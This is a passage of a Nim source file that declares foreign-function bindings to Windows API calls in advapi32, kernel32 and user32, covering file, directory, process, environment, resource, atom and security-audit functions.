DesiredAccess: DWORD, AuditType: AUDIT_EVENT_TYPE, Flags: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccess: LPDWORD, AccessStatus: LPBOOL, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "AccessCheckByTypeAndAuditAlarmA".}  proc AccessCheckByTypeResultListAndAuditAlarm*(SubsystemName: LPCSTR, HandleId: LPVOID, ObjectTypeName: LPCSTR, ObjectName: LPCSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, DesiredAccess: DWORD, AuditType: AUDIT_EVENT_TYPE, Flags: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccess: LPDWORD, AccessStatusList: LPDWORD, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "AccessCheckByTypeResultListAndAuditAlarmA".}  proc AccessCheckByTypeResultListAndAuditAlarmByHandle*(SubsystemName: LPCSTR, HandleId: LPVOID, ClientToken: HANDLE, ObjectTypeName: LPCSTR, ObjectName: LPCSTR, SecurityDescriptor: PSECURITY_DESCRIPTOR, PrincipalSelfSid: PSID, DesiredAccess: DWORD, AuditType: AUDIT_EVENT_TYPE, Flags: DWORD, ObjectTypeList: POBJECT_TYPE_LIST, ObjectTypeListLength: DWORD, GenericMapping: PGENERIC_MAPPING, ObjectCreation: WINBOOL, GrantedAccess: LPDWORD, AccessStatusList: LPDWORD, pfGenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "AccessCheckByTypeResultListAndAuditAlarmByHandleA".}  proc ObjectOpenAuditAlarm*(SubsystemName: LPCSTR, HandleId: LPVOID, ObjectTypeName: LPSTR, ObjectName: LPSTR, pSecurityDescriptor: PSECURITY_DESCRIPTOR, ClientToken: HANDLE, DesiredAccess: DWORD, GrantedAccess: DWORD, Privileges: PPRIVILEGE_SET, ObjectCreation: WINBOOL, AccessGranted: WINBOOL, GenerateOnClose: LPBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ObjectOpenAuditAlarmA".}  proc ObjectPrivilegeAuditAlarm*(SubsystemName: LPCSTR, HandleId: LPVOID, ClientToken: HANDLE, DesiredAccess: DWORD, Privileges: PPRIVILEGE_SET, AccessGranted: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ObjectPrivilegeAuditAlarmA".}  proc ObjectCloseAuditAlarm*(SubsystemName: LPCSTR, HandleId: LPVOID, GenerateOnClose: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ObjectCloseAuditAlarmA".}  proc ObjectDeleteAuditAlarm*(SubsystemName: LPCSTR, HandleId: LPVOID, GenerateOnClose: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "ObjectDeleteAuditAlarmA".}  proc PrivilegedServiceAuditAlarm*(SubsystemName: LPCSTR, ServiceName: LPCSTR, ClientToken: HANDLE, Privileges: PPRIVILEGE_SET, AccessGranted: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "PrivilegedServiceAuditAlarmA".}  proc SetFileSecurity*(lpFileName: LPCSTR, SecurityInformation: SECURITY_INFORMATION, pSecurityDescriptor: PSECURITY_DESCRIPTOR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "SetFileSecurityA".}  proc GetFileSecurity*(lpFileName: LPCSTR, RequestedInformation: SECURITY_INFORMATION, pSecurityDescriptor: PSECURITY_DESCRIPTOR, nLength: DWORD, lpnLengthNeeded: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "GetFileSecurityA".}  proc SetComputerNameEx*(NameType: COMPUTER_NAME_FORMAT, lpBuffer: LPCTSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetComputerNameExA".}  proc CreateProcessAsUser*(hToken: HANDLE, lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "CreateProcessAsUserA".}  proc FindFirstVolume*(lpszVolumeName: LPSTR, cchBufferLength: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "FindFirstVolumeA".}  proc FindNextVolume*(hFindVolume: HANDLE, lpszVolumeName: LPSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "FindNextVolumeA".}  proc DeleteVolumeMountPoint*(lpszVolumeMountPoint: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "DeleteVolumeMountPointA".}  proc GetVolumeNameForVolumeMountPoint*(lpszVolumeMountPoint: LPCSTR, lpszVolumeName: LPSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetVolumeNameForVolumeMountPointA".}  proc GetVolumePathName*(lpszFileName: LPCSTR, lpszVolumePathName: LPSTR, cchBufferLength: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetVolumePathNameA".}  proc GetVolumePathNamesForVolumeName*(lpszVolumeName: LPCSTR, lpszVolumePathNames: LPCH, cchBufferLength: DWORD, lpcchReturnLength: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetVolumePathNamesForVolumeNameA".}  proc OutputDebugString*(lpOutputString: LPCSTR): VOID {.winapi, stdcall, dynlib: "kernel32", importc: "OutputDebugStringA".}  proc CreateFile*(lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateFileA".}  proc FindFirstChangeNotification*(lpPathName: LPCSTR, bWatchSubtree: WINBOOL, dwNotifyFilter: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "FindFirstChangeNotificationA".}  proc FindFirstFile*(lpFileName: LPCSTR, lpFindFileData: LPWIN32_FIND_DATAA): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "FindFirstFileA".}  proc GetDiskFreeSpace*(lpRootPathName: LPCSTR, lpSectorsPerCluster: LPDWORD, lpBytesPerSector: LPDWORD, lpNumberOfFreeClusters: LPDWORD, lpTotalNumberOfClusters: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetDiskFreeSpaceA".}  proc GetDriveType*(lpRootPathName: LPCSTR): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetDriveTypeA".}  proc GetFileAttributes*(lpFileName: LPCSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetFileAttributesA".}  proc GetFullPathName*(lpFileName: LPCSTR, nBufferLength: DWORD, lpBuffer: LPSTR, lpFilePart: ptr LPSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetFullPathNameA".}  proc GetLongPathName*(lpszShortPath: LPCSTR, lpszLongPath: LPSTR, cchBuffer: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetLongPathNameA".}  proc GetFinalPathNameByHandle*(hFile: HANDLE, lpszFilePath: LPSTR, cchFilePath: DWORD, dwFlags: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetFinalPathNameByHandleA".}  proc CreateDirectory*(lpPathName: LPCSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CreateDirectoryA".}  proc DeleteFile*(lpFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "DeleteFileA".}  proc FindFirstFileEx*(lpFileName: LPCSTR, fInfoLevelId: FINDEX_INFO_LEVELS, lpFindFileData: LPVOID, fSearchOp: FINDEX_SEARCH_OPS, lpSearchFilter: LPVOID, dwAdditionalFlags: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "FindFirstFileExA".}  proc FindNextFile*(hFindFile: HANDLE, lpFindFileData: LPWIN32_FIND_DATAA): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "FindNextFileA".}  proc GetDiskFreeSpaceEx*(lpDirectoryName: LPCSTR, lpFreeBytesAvailableToCaller: PULARGE_INTEGER, lpTotalNumberOfBytes: PULARGE_INTEGER, lpTotalNumberOfFreeBytes: PULARGE_INTEGER): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetDiskFreeSpaceExA".}  proc GetFileAttributesEx*(lpFileName: LPCSTR, fInfoLevelId: GET_FILEEX_INFO_LEVELS, lpFileInformation: LPVOID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetFileAttributesExA".}  proc RemoveDirectory*(lpPathName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "RemoveDirectoryA".}  proc SetFileAttributes*(lpFileName: LPCSTR, dwFileAttributes: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetFileAttributesA".}  proc GetModuleHandleEx*(dwFlags: DWORD, lpModuleName: LPCSTR, phModule: ptr HMODULE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetModuleHandleExA".}  proc LoadString*(hInstance: HINSTANCE, uID: UINT, lpBuffer: LPSTR, cchBufferMax: int32): int32 {.winapi, stdcall, dynlib: "user32", importc: "LoadStringA".}  proc GetModuleFileName*(hModule: HMODULE, lpFilename: LPSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetModuleFileNameA".}  proc GetModuleHandle*(lpModuleName: LPCSTR): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc: "GetModuleHandleA".}  proc LoadLibraryEx*(lpLibFileName: LPCSTR, hFile: HANDLE, dwFlags: DWORD): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc: "LoadLibraryExA".}  proc EnumResourceLanguages*(hModule: HMODULE, lpType: LPCSTR, lpName: LPCSTR, lpEnumFunc: ENUMRESLANGPROCA, lParam: LONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EnumResourceLanguagesA".}  proc EnumResourceLanguagesEx*(hModule: HMODULE, lpType: LPCSTR, lpName: LPCSTR, lpEnumFunc: ENUMRESLANGPROCA, lParam: LONG_PTR, dwFlags: DWORD, LangId: LANGID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EnumResourceLanguagesExA".}  proc EnumResourceNamesEx*(hModule: HMODULE, lpType: LPCSTR, lpEnumFunc: ENUMRESNAMEPROCA, lParam: LONG_PTR, dwFlags: DWORD, LangId: LANGID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EnumResourceNamesExA".}  proc EnumResourceTypesEx*(hModule: HMODULE, lpEnumFunc: ENUMRESTYPEPROCA, lParam: LONG_PTR, dwFlags: DWORD, LangId: LANGID): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EnumResourceTypesExA".}  proc ExpandEnvironmentStrings*(lpSrc: LPCSTR, lpDst: LPSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "ExpandEnvironmentStringsA".}  proc FreeEnvironmentStrings*(penv: LPCH): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "FreeEnvironmentStringsA".}  proc GetCommandLine*(): LPSTR {.winapi, stdcall, dynlib: "kernel32", importc: "GetCommandLineA".}  proc GetCurrentDirectory*(nBufferLength: DWORD, lpBuffer: LPSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetCurrentDirectoryA".}  proc GetEnvironmentVariable*(lpName: LPCSTR, lpBuffer: LPSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetEnvironmentVariableA".}  proc NeedCurrentDirectoryForExePath*(ExeName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "NeedCurrentDirectoryForExePathA".}  proc SearchPath*(lpPath: LPCSTR, lpFileName: LPCSTR, lpExtension: LPCSTR, nBufferLength: DWORD, lpBuffer: LPSTR, lpFilePart: ptr LPSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "SearchPathA".}  proc SetCurrentDirectory*(lpPathName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetCurrentDirectoryA".}  proc SetEnvironmentVariable*(lpName: LPCSTR, lpValue: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetEnvironmentVariableA".}  proc CreateProcess*(lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CreateProcessA".}  proc CreateMutexEx*(lpMutexAttributes: LPSECURITY_ATTRIBUTES, lpName: LPCSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateMutexExA".}  proc CreateEventEx*(lpEventAttributes: LPSECURITY_ATTRIBUTES, lpName: LPCSTR, dwFlags: DWORD, dwDesiredAccess: DWORD): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateEventExA".}  proc OpenEvent*(dwDesiredAccess: DWORD, bInheritHandle: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "OpenEventA".}  proc CreateMutex*(lpMutexAttributes: LPSECURITY_ATTRIBUTES, bInitialOwner: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateMutexA".}  proc CreateEvent*(lpEventAttributes: LPSECURITY_ATTRIBUTES, bManualReset: WINBOOL, bInitialState: WINBOOL, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateEventA".}  proc GetSystemDirectory*(lpBuffer: LPSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetSystemDirectoryA".}  proc GetWindowsDirectory*(lpBuffer: LPSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetWindowsDirectoryA".}  proc GetSystemWindowsDirectory*(lpBuffer: LPSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetSystemWindowsDirectoryA".}  proc GetComputerNameEx*(NameType: COMPUTER_NAME_FORMAT, lpBuffer: LPSTR, nSize: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetComputerNameExA".}  proc GetVersionEx*(lpVersionInformation: LPOSVERSIONINFOA): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetVersionExA".}  proc GetBinaryType*(lpApplicationName: LPCSTR, lpBinaryType: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetBinaryTypeA".}  proc GetLongPathNameTransacted*(lpszShortPath: LPCSTR, lpszLongPath: LPSTR, cchBuffer: DWORD, hTransaction: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetLongPathNameTransactedA".}  proc SetFileShortName*(hFile: HANDLE, lpShortName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetFileShortNameA".}  proc FormatMessage*(dwFlags: DWORD, lpSource: LPCVOID, dwMessageId: DWORD, dwLanguageId: DWORD, lpBuffer: LPSTR, nSize: DWORD, Arguments: ptr va_list): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "FormatMessageA".}  proc CreateMailslot*(lpName: LPCSTR, nMaxMessageSize: DWORD, lReadTimeout: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateMailslotA".}  proc EncryptFile*(lpFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "EncryptFileA".}  proc DecryptFile*(lpFileName: LPCSTR, dwReserved: DWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "DecryptFileA".}  proc FileEncryptionStatus*(lpFileName: LPCSTR, lpStatus: LPDWORD): WINBOOL {.winapi, stdcall, dynlib: "advapi32", importc: "FileEncryptionStatusA".}  proc OpenEncryptedFileRaw*(lpFileName: LPCSTR, ulFlags: ULONG, pvContext: ptr PVOID): DWORD {.winapi, stdcall, dynlib: "advapi32", importc: "OpenEncryptedFileRawA".}  proc lstrcmp*(lpString1: LPCSTR, lpString2: LPCSTR): int32 {.winapi, stdcall, dynlib: "kernel32", importc: "lstrcmpA".}  proc lstrcmpi*(lpString1: LPCSTR, lpString2: LPCSTR): int32 {.winapi, stdcall, dynlib: "kernel32", importc: "lstrcmpiA".}  proc lstrcpyn*(lpString1: LPSTR, lpString2: LPCSTR, iMaxLength: int32): LPSTR {.winapi, stdcall, dynlib: "kernel32", importc: "lstrcpynA".}  proc lstrcpy*(lpString1: LPSTR, lpString2: LPCSTR): LPSTR {.winapi, stdcall, dynlib: "kernel32", importc: "lstrcpyA".}  proc lstrcat*(lpString1: LPSTR, lpString2: LPCSTR): LPSTR {.winapi, stdcall, dynlib: "kernel32", importc: "lstrcatA".}  proc lstrlen*(lpString: LPCSTR): int32 {.winapi, stdcall, dynlib: "kernel32", importc: "lstrlenA".}  proc CreateSemaphore*(lpSemaphoreAttributes: LPSECURITY_ATTRIBUTES, lInitialCount: LONG, lMaximumCount: LONG, lpName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateSemaphoreA".}  proc CreateWaitableTimer*(lpTimerAttributes: LPSECURITY_ATTRIBUTES, bManualReset: WINBOOL, lpTimerName: LPCSTR): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateWaitableTimerA".}  proc LoadLibrary*(lpLibFileName: LPCSTR): HMODULE {.winapi, stdcall, dynlib: "kernel32", importc: "LoadLibraryA".}  proc QueryFullProcessImageName*(hProcess: HANDLE, dwFlags: DWORD, lpExeName: LPSTR, lpdwSize: PDWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "QueryFullProcessImageNameA".}  proc FatalAppExit*(uAction: UINT, lpMessageText: LPCSTR): VOID {.winapi, stdcall, dynlib: "kernel32", importc: "FatalAppExitA".}  proc GetFirmwareEnvironmentVariable*(lpName: LPCSTR, lpGuid: LPCSTR, pBuffer: PVOID, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetFirmwareEnvironmentVariableA".}  proc SetFirmwareEnvironmentVariable*(lpName: LPCSTR, lpGuid: LPCSTR, pValue: PVOID, nSize: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetFirmwareEnvironmentVariableA".}  proc FindResource*(hModule: HMODULE, lpName: LPCSTR, lpType: LPCSTR): HRSRC {.winapi, stdcall, dynlib: "kernel32", importc: "FindResourceA".}  proc EnumResourceTypes*(hModule: HMODULE, lpEnumFunc: ENUMRESTYPEPROCA, lParam: LONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EnumResourceTypesA".}  proc EnumResourceNames*(hModule: HMODULE, lpType: LPCSTR, lpEnumFunc: ENUMRESNAMEPROCA, lParam: LONG_PTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EnumResourceNamesA".}  proc BeginUpdateResource*(pFileName: LPCSTR, bDeleteExistingResources: WINBOOL): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "BeginUpdateResourceA".}  proc UpdateResource*(hUpdate: HANDLE, lpType: LPCSTR, lpName: LPCSTR, wLanguage: WORD, lpData: LPVOID, cb: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "UpdateResourceA".}  proc EndUpdateResource*(hUpdate: HANDLE, fDiscard: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "EndUpdateResourceA".}  proc GlobalAddAtom*(lpString: LPCSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc: "GlobalAddAtomA".}  proc GlobalAddAtomEx*(lpString: LPCSTR, Flags: DWORD): ATOM {.winapi, stdcall, dynlib: "kernel32", importc: "GlobalAddAtomExA".}  proc GlobalFindAtom*(lpString: LPCSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc: "GlobalFindAtomA".}  proc GlobalGetAtomName*(nAtom: ATOM, lpBuffer: LPSTR, nSize: int32): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GlobalGetAtomNameA".}  proc AddAtom*(lpString: LPCSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc: "AddAtomA".}  proc FindAtom*(lpString: LPCSTR): ATOM {.winapi, stdcall, dynlib: "kernel32", importc: "FindAtomA".}  proc GetAtomName*(nAtom: ATOM, lpBuffer: LPSTR, nSize: int32): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetAtomNameA".}  proc GetProfileInt*(lpAppName: LPCSTR, lpKeyName: LPCSTR, nDefault: INT): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetProfileIntA".}  proc GetProfileString*(lpAppName: LPCSTR, lpKeyName: LPCSTR, lpDefault: LPCSTR, lpReturnedString: LPSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetProfileStringA".}  proc WriteProfileString*(lpAppName: LPCSTR, lpKeyName: LPCSTR, lpString: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "WriteProfileStringA".}  proc GetProfileSection*(lpAppName: LPCSTR, lpReturnedString: LPSTR, nSize: DWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetProfileSectionA".}  proc WriteProfileSection*(lpAppName: LPCSTR, lpString: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "WriteProfileSectionA".}  proc GetPrivateProfileInt*(lpAppName: LPCSTR, lpKeyName: LPCSTR, nDefault: INT, lpFileName: LPCSTR): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetPrivateProfileIntA".}  proc GetPrivateProfileString*(lpAppName: LPCSTR, lpKeyName: LPCSTR, lpDefault: LPCSTR, lpReturnedString: LPSTR, nSize: DWORD, lpFileName: LPCSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetPrivateProfileStringA".}  proc WritePrivateProfileString*(lpAppName: LPCSTR, lpKeyName: LPCSTR, lpString: LPCSTR, lpFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "WritePrivateProfileStringA".}  proc GetPrivateProfileSection*(lpAppName: LPCSTR, lpReturnedString: LPSTR, nSize: DWORD, lpFileName: LPCSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetPrivateProfileSectionA".}  proc WritePrivateProfileSection*(lpAppName: LPCSTR, lpString: LPCSTR, lpFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "WritePrivateProfileSectionA".}  proc GetPrivateProfileSectionNames*(lpszReturnBuffer: LPSTR, nSize: DWORD, lpFileName: LPCSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetPrivateProfileSectionNamesA".}  proc GetPrivateProfileStruct*(lpszSection: LPCSTR, lpszKey: LPCSTR, lpStruct: LPVOID, uSizeStruct: UINT, szFile: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetPrivateProfileStructA".}  proc WritePrivateProfileStruct*(lpszSection: LPCSTR, lpszKey: LPCSTR, lpStruct: LPVOID, uSizeStruct: UINT, szFile: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "WritePrivateProfileStructA".}  proc GetFirmwareEnvironmentVariableEx*(lpName: LPCSTR, lpGuid: LPCSTR, pBuffer: PVOID, nSize: DWORD, pdwAttribubutes: PDWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetFirmwareEnvironmentVariableExA".}  proc SetFirmwareEnvironmentVariableEx*(lpName: LPCSTR, lpGuid: LPCSTR, pValue: PVOID, nSize: DWORD, dwAttributes: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetFirmwareEnvironmentVariableExA".}  proc GetSystemWow64Directory*(lpBuffer: LPSTR, uSize: UINT): UINT {.winapi, stdcall, dynlib: "kernel32", importc: "GetSystemWow64DirectoryA".}  proc SetDllDirectory*(lpPathName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetDllDirectoryA".}  proc GetDllDirectory*(nBufferLength: DWORD, lpBuffer: LPSTR): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetDllDirectoryA".}  proc CreateDirectoryEx*(lpTemplateDirectory: LPCSTR, lpNewDirectory: LPCSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CreateDirectoryExA".}  proc CreateDirectoryTransacted*(lpTemplateDirectory: LPCSTR, lpNewDirectory: LPCSTR, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CreateDirectoryTransactedA".}  proc RemoveDirectoryTransacted*(lpPathName: LPCSTR, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "RemoveDirectoryTransactedA".}  proc GetFullPathNameTransacted*(lpFileName: LPCSTR, nBufferLength: DWORD, lpBuffer: LPSTR, lpFilePart: ptr LPSTR, hTransaction: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetFullPathNameTransactedA".}  proc CreateFileTransacted*(lpFileName: LPCSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE, hTransaction: HANDLE, pusMiniVersion: PUSHORT, lpExtendedParameter: PVOID): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "CreateFileTransactedA".}  proc SetFileAttributesTransacted*(lpFileName: LPCSTR, dwFileAttributes: DWORD, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "SetFileAttributesTransactedA".}  proc GetFileAttributesTransacted*(lpFileName: LPCSTR, fInfoLevelId: GET_FILEEX_INFO_LEVELS, lpFileInformation: LPVOID, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "GetFileAttributesTransactedA".}  proc GetCompressedFileSize*(lpFileName: LPCSTR, lpFileSizeHigh: LPDWORD): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetCompressedFileSizeA".}  proc DeleteFileTransacted*(lpFileName: LPCSTR, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "DeleteFileTransactedA".}  proc GetCompressedFileSizeTransacted*(lpFileName: LPCSTR, lpFileSizeHigh: LPDWORD, hTransaction: HANDLE): DWORD {.winapi, stdcall, dynlib: "kernel32", importc: "GetCompressedFileSizeTransactedA".}  proc FindFirstFileTransacted*(lpFileName: LPCSTR, fInfoLevelId: FINDEX_INFO_LEVELS, lpFindFileData: LPVOID, fSearchOp: FINDEX_SEARCH_OPS, lpSearchFilter: LPVOID, dwAdditionalFlags: DWORD, hTransaction: HANDLE): HANDLE {.winapi, stdcall, dynlib: "kernel32", importc: "FindFirstFileTransactedA".}  proc CopyFileTransacted*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, pbCancel: LPBOOL, dwCopyFlags: DWORD, hTransaction: HANDLE): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CopyFileTransactedA".}  proc CheckNameLegalDOS8Dot3*(lpName: LPCSTR, lpOemName: LPSTR, OemNameSize: DWORD, pbNameContainsSpaces: PBOOL, pbNameLegal: PBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CheckNameLegalDOS8Dot3A".}  proc CopyFile*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR, bFailIfExists: WINBOOL): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CopyFileA".}  proc CopyFileEx*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, pbCancel: LPBOOL, dwCopyFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "CopyFileExA".}  proc MoveFile*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "MoveFileA".}  proc MoveFileEx*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "MoveFileExA".}  proc MoveFileWithProgress*(lpExistingFileName: LPCSTR, lpNewFileName: LPCSTR, lpProgressRoutine: LPPROGRESS_ROUTINE, lpData: LPVOID, dwFlags: DWORD): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc: "MoveFileWithProgressA".}  proc 